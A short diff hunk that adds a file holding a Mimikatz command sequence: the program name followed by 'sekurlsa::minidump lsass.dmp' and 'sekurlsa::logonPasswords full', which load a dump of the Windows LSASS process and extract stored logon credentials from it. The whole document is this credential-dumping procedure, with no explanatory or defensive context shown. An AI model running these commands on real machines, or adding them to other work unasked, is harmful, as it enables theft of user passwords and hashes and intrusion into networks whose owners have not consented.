@@ -1,0 +1,4 @@
+
+mimikatz.exe
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords full
